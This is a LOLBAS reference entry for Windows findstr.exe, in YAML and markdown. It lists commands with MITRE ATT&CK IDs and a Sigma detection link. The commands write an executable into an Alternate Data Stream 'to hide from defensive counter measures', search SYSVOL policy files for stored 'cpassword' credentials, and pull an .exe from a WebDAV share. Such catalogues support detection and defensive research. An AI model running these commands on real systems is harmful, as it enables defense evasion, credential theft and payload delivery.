---
Acknowledgement:
- Person: Oddvar
Author: Oddvar Moe
Commands:
- Category: ADS
  Command: findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
  Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    the specified .exe file is written to an Alternate Data Stream (ADS) of the specified
    target file.
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Add a file to an alternate data stream to hide from defensive counter measures
- Category: ADS
  Command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
  Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Add a file to an alternate data stream from a webdav server to hide from
    defensive counter measures
- Category: Credentials
  Command: findstr /S /I cpassword \\sysvol\policies\*.xml
  Description: Search for stored password in Group Policy files stored on SYSVOL.
  MitreID: T1552.001
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Find credentials stored in cpassword attrbute
- Category: Download
  Command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
  Description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    file.exe is downloaded to the target file.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Download/Copy file from webdav server
Created: 2018-05-25
Description: Write to ADS, discover, or download files with Findstr.exe
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_findstr.yml
Full_Path:
- Path: C:\Windows\System32\findstr.exe
- Path: C:\Windows\SysWOW64\findstr.exe
Name: Findstr.exe
Resources:
- Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
- Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
mitre_data:
  technique_ids:
  - T1564.004
  - T1552.001
  - T1105
tags:
- lolbas/osbinaries
---

# Findstr.exe

Write to ADS, discover, or download files with Findstr.exe

# Path(s)

- `C:\Windows\System32\findstr.exe`
- `C:\Windows\SysWOW64\findstr.exe`

# Credentials Commands

Search for stored password in Group Policy files stored on SYSVOL.

```batch
findstr /S /I cpassword \\sysvol\policies\*.xml
```

- **Usecase:** Find credentials stored in cpassword attrbute
- **Privileges Required:** User
- **MitreID:** `T1552.001`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# ADS Commands

Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.

```batch
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
```

- **Usecase:** Add a file to an alternate data stream to hide from defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.

```batch
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
```

- **Usecase:** Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Download Commands

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.

```batch
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
```

- **Usecase:** Download/Copy file from webdav server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Oddvar